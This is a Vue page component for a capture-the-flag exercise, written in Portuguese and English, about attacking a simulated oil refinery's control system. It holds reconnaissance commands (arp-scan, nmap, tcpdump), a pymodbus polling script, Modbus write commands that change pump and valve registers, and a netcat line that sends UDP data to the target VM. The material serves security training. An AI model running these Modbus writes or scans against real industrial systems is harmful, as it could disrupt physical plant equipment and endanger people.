<template>
  <div>
    <h1>Welcome to the Capture The Flag Game</h1>
    <p>Explore the challenges and see if you can claim victory!</p>
    <img 
      src="@/assets/challenge_viewer.png" 
      alt="viewer" 
      style="width: 800px; height: 600px; max-width: 100%; object-fit: cover; display: block; margin: 0 auto;" 
    />
    <h2>Campanha de Instruções</h2>
    <ol>
      <li>
        <strong>Para onde vão os alertas críticos da refinaria em casos de problemas na operação (porta/protocolo)?</strong>
        <p>Investigue quais portas e protocolos são utilizados para a comunicação de alertas críticos. Isso pode ajudar a entender melhor o fluxo de dados na refinaria e possíveis pontos de entrada.</p>
      </li>
      <li>
        <strong>Qual a janela de tempo que está passível a um ataque?</strong>
        <p>Identifique a janela de vulnerabilidade durante a qual a refinaria está exposta a possíveis ataques. Isso pode variar dependendo da configuração e das políticas de segurança em vigor.</p>
      </li>
      <li>
        <strong>Onde está o código de acesso do esquema da refinaria?</strong>
        <p>Esse código de acesso é essencial para navegar pelos sistemas da refinaria. Explore o ambiente em busca de informações que possam fornecer pistas sobre sua localização.</p>
      </li>
      <li>
        <strong>O que é necessário para obter o arquivo com o código do esquema da refinaria?</strong>
        <p>Experimente enviar dados para a porta/protocolo que recebe os alertas críticos e observe o comportamento da resposta. Você pode precisar de um método específico de comunicação para acessar esse arquivo.</p>
        <ul>
          <li>a. Se sim, qual foi o comportamento obtido?</li>
          <li>b. Se enviar uma mensagem inesperada, o que acontece?</li>
        </ul>
      </li>
    </ol>

    <h3>Script de Varredura</h3>
    <pre>
      <code>
#!/usr/bin/env python3

import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=5020)
client.connect()
while True:
    rr = client.read_holding_registers(1, 16)
    print(rr.registers)
    time.sleep(1)
      </code>
    </pre>

    <h3>Comandos de Escrita</h3>
    <pre>
      <code>
client.write_register(1, 1) # PLC_FEED_PUMP
client.write_register(3, 1) # PLC_OUTLET_VALVE
client.write_register(4, 1) # PLC_SEP_OIL_VALVE
client.write_register(8, 0) # PLC_WASTE_WATER_VALVE
      </code>
    </pre>

    <h3>Objetivo</h3>
    <p>Identificar o alvo e serviços expostos</p>
    <pre>
      <code>
$ sudo arp-scan --ignoredups --localnet
$ sudo nmap -A -Pn -T3 &lt;ip_vmalvo&gt;
<span>http://&lt;ip_vmalvo&gt;/</span>
      </code>
    </pre>

    <h3>Discovery Abnormal Traffic</h3>
    <pre>
      <code>
$ sudo nmap -Pn -T3 --version-intensity 9 –p- &lt;ip_vmalvo&gt; -vv
$ sudo tcpdump -i eth0 -A -n host &lt;ip_vmalvo&gt; and not port 80
$ sudo tcpdump -i eth0 -A -n host &lt;ip_vmalvo&gt; and udp
$ sudo tcpdump -i eth0 -A -n host &lt;ip_vmalvo&gt; and not arp
      </code>
    </pre>

    <h3>Python Attack Scripts</h3>
    <pre>
      <code>
$ python2.7 -c "print ‘sua mensagem aqui’ " | nc -u &lt;ip_vmalvo&gt; 5021 -q1
      </code>
    </pre>
  </div>
</template>

<script lang="ts" setup>
</script>

<style scoped>
/* Adicione estilos específicos para a página inicial aqui */
h2, h3 {
  margin-top: 20px;
  color: #003366;
}
code {
  background-color: #f4f4f4;
  padding: 10px;
  display: block;
  border-radius: 5px;
  margin-top: 10px;
}
</style>
